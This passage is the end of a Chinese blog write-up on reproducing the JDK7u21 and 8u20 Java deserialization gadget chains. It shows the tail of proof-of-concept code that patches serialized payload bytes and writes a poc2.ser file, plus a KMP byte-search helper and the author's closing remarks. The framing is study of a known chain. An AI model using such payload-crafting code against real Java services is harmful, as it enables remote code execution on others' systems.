</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> pattern <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]{(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x78<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x73<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x72<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x00<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x11<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x6A<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x61<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x76<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x61<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x2E<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x6C<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x61<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x6E<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x67<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x2E<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x49<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>            0x6E<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x74<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x65<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x67<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x65<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x72<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x12<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0xE2<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0xA0<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0xA4<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0xF7<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x81<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x87<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x38<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x02<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x00<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>            0x01<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x49<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x00<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x05<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x76<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x61<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x6C<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x75<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x65<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x78<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x72<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x00<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x10<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x6A<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x61<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x76<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>            0x61<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x2E<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x6C<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x61<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x6E<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x67<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x2E<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x4E<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x75<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x6D<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x62<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x65<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x72<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x86<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0xAC<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x95<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>            0x1D<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x0B<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x94<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0xE0<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x8B<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x02<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x00<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x00<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x78<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x70<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x00<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x00<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x00<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">)</span> 0x00<span style="color:#ff79c6">};</span>
</span></span><span style="display:flex;"><span>        ser <span style="color:#ff79c6">=</span> ByteUtils<span style="color:#ff79c6">.</span><span style="color:#50fa7b">deleteByPattern</span><span style="color:#ff79c6">(</span>ser<span style="color:#ff79c6">,</span> pattern<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        FileUtils<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeByteArrayToFile</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> File<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;files/Jdk8u20/poc2.ser&#34;</span><span style="color:#ff79c6">),</span> ser<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        writeExp();
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> ser <span style="color:#ff79c6">=</span> FileUtils<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readFileToByteArray</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> File<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;files/Jdk8u20/poc2.ser&#34;</span><span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>        Deserializer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">deserialize</span><span style="color:#ff79c6">(</span>ser<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>另外由于此时数据结构的DDL已经干完 = = ，搜索字节并删除的方法我用了KMP算法，这里也小贴一下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> ysoserial.payloads.util<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">ByteUtils</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> <span style="color:#50fa7b">deleteByPattern</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> source<span style="color:#ff79c6">,</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> pattern<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> start <span style="color:#ff79c6">=</span> indexOf<span style="color:#ff79c6">(</span>source<span style="color:#ff79c6">,</span> pattern<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> ans <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[</span>source<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span> <span style="color:#ff79c6">-</span> pattern<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span><span style="color:#ff79c6">];</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> 0<span style="color:#ff79c6">;</span> i <span style="color:#ff79c6">&lt;</span> start<span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">++)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            ans<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> source<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">];</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> start<span style="color:#ff79c6">;</span> i <span style="color:#ff79c6">&lt;</span> ans<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span><span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">++)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            ans<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> source<span style="color:#ff79c6">[</span>i <span style="color:#ff79c6">+</span> pattern<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span><span style="color:#ff79c6">];</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> ans<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">int</span> <span style="color:#50fa7b">indexOf</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> source<span style="color:#ff79c6">,</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> pattern<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span><span style="color:#ff79c6">[]</span> next <span style="color:#ff79c6">=</span> getNext<span style="color:#ff79c6">(</span>pattern<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> 0<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> j <span style="color:#ff79c6">=</span> 0<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">(</span>i <span style="color:#ff79c6">&lt;</span> source<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span> <span style="color:#ff79c6">&amp;&amp;</span> j <span style="color:#ff79c6">&lt;</span> pattern<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>j <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span>1 <span style="color:#ff79c6">||</span> source<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">==</span> pattern<span style="color:#ff79c6">[</span>j<span style="color:#ff79c6">])</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                i<span style="color:#ff79c6">++;</span>
</span></span><span style="display:flex;"><span>                j<span style="color:#ff79c6">++;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                j <span style="color:#ff79c6">=</span> next<span style="color:#ff79c6">[</span>j<span style="color:#ff79c6">];</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>j <span style="color:#ff79c6">==</span> pattern<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> i <span style="color:#ff79c6">-</span> j<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span>1<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">int</span><span style="color:#ff79c6">[]</span> <span style="color:#50fa7b">getNext</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> chars<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span><span style="color:#ff79c6">[]</span> next <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">int</span><span style="color:#ff79c6">[</span>chars<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span><span style="color:#ff79c6">];</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> j <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span>1<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> 0<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        next<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span>1<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">(</span>i <span style="color:#ff79c6">&lt;</span> chars<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span> <span style="color:#ff79c6">-</span> 1<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>j <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span>1 <span style="color:#ff79c6">||</span> chars<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">==</span> chars<span style="color:#ff79c6">[</span>j<span style="color:#ff79c6">])</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                next<span style="color:#ff79c6">[++</span>i<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">++</span>j<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                j <span style="color:#ff79c6">=</span> next<span style="color:#ff79c6">[</span>j<span style="color:#ff79c6">];</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> next<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">printByte</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> b<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">print</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;[&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> 0<span style="color:#ff79c6">;</span> i <span style="color:#ff79c6">&lt;</span> b<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span><span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">++)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">print</span><span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;,&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">print</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;]&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> source <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]{</span>1<span style="color:#ff79c6">,</span> 2<span style="color:#ff79c6">,</span> 3<span style="color:#ff79c6">,</span> 4<span style="color:#ff79c6">,</span> 5<span style="color:#ff79c6">};</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> pattern <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]{</span>2<span style="color:#ff79c6">,</span> 3<span style="color:#ff79c6">};</span>
</span></span><span style="display:flex;"><span>        printByte<span style="color:#ff79c6">(</span>deleteByPattern<span style="color:#ff79c6">(</span>source<span style="color:#ff79c6">,</span> pattern<span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><h1 id="后记">后记</h1>
<p>对我而言复现8u20是一件非常困难的事情，正如标题所说，我做的工作仅仅只是“觑觎”。刚开始我试图用一些非常原始的方法手搓二进制，因为已经有前人成功做了这项工作并且完成得很好。但是我实在是无法短时间内做到。最后按照1nhann师傅的思路，连猜带蒙地复现了这条链子。不禁感叹我和这些优秀前辈的差距。正如我在博客首页上写给我自己的定义：</p>
<blockquote>
<p>Fortunate enough to get a glimpse of the feast of techiques.</p>
</blockquote>

        </p>
    </div>
</div>

<aside class="post-toc">
    <nav id="toc">
        <nav id="TableOfContents">
  <ul>
    <li><a href="#前言">前言</a></li>
    <li><a href="#jdk7u21">JDK7u21</a>
      <ul>
        <li><a href="#hashmap">HashMap</a></li>
        <li><a href="#利用链分析">利用链分析</a></li>
        <li><a href="#精简版poc">精简版POC</a></li>
        <li><a href="#ysoserial的poc">ysoserial的POC</a></li>
      </ul>
    </li>
    <li><a href="#jdk-8u20">JDK 8u20</a>
      <ul>
        <li><a href="#jdk7u21的修复">JDK7u21的修复</a></li>
        <li><a href="#java原生反序列化协议">Java原生反序列化协议</a></li>
        <li><a href="#多重try-catch">多重try catch</a></li>
        <li><a href="#jdk8u20链分析">JDK8U20链分析</a></li>
        <li><a href="#poc">POC</a></li>
      </ul>
    </li>
    <li><a href="#后记">后记</a></li>
  </ul>
</nav>
    </nav>
</aside>



    

        </main><footer class="footer">
    <span>&copy; 2022 </span>
    <span>
        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
    </span>
</footer>
</body>
</html>
